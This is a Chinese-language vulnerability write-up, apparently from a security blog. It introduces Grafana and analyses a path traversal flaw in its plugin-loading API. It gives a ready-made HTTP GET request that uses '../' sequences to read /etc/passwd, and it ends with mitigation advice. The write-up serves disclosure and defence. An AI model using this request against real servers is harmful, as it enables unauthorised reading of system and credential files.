# 一、Grafana简介

Grafana是一个跨平台的开源的度量分析和可视化工具，可以通过将采集的数据查询然后可视化的展示，并及时通知。它主要有以下六大特点：

1、展示方式：快速灵活的客户端图表，面板插件有许多不同方式的可视化指标和日志，官方库中具有丰富的仪表盘插件，比如热图、折线图、图表等多种展示方式；

2、数据源：Graphite，InfluxDB，OpenTSDB，Prometheus，Elasticsearch，CloudWatch和KairosDB等；

3、通知提醒：以可视方式定义最重要指标的警报规则，Grafana将不断计算并发送通知，在数据达到阈值时通过Slack、PagerDuty等获得通知；

4、混合展示：在同一图表中混合使用不同的数据源，可以基于每个查询指定数据源，甚至自定义数据源；

5、注释：使用来自不同数据源的丰富事件注释图表，将鼠标悬停在事件上会显示完整的事件元数据和标记；

6、过滤器：Ad-hoc过滤器允许动态创建新的键/值过滤器，这些过滤器会自动应用于使用该数据源的所有查询。

# 二、漏洞分析

漏洞由`grafana-main\pkg\api\api.g`o引起

![image.png](https://image.3001.net/images/20211209/1639011455_61b1547fd88db6e6a34c4.png!small)

    
    
    grafana-main\pkg\api\plugins.go
    

分析原因：  
api功能可以实现加载插件文件，然后返回文件内容  
由于加载路径时候未进行过滤，导致../实现任意文件读取。

![image.png](https://image.3001.net/images/20211209/1639011486_61b1549e779dae64bdd3a.png!small)最后返回文件内容：

![image.png](https://image.3001.net/images/20211209/1639011521_61b154c188615e1b0dd3f.png!small)

# 三、利用

    
    
    GET /public/plugins/welcome/../../../../../../../../etc/passwd HTTP/1.1
    Host: 127.0.0.1:3000
    Content-Length: 21
    Connection: close
    

![image.png](https://image.3001.net/images/20211209/1639011659_61b1554bb48bb99945d6f.png!small)

# 四、漏洞修复

1、建议对../以及相关编码进行过滤。  
2、上waf  
3、加反向代理利用中间件对路径做normalize操作。

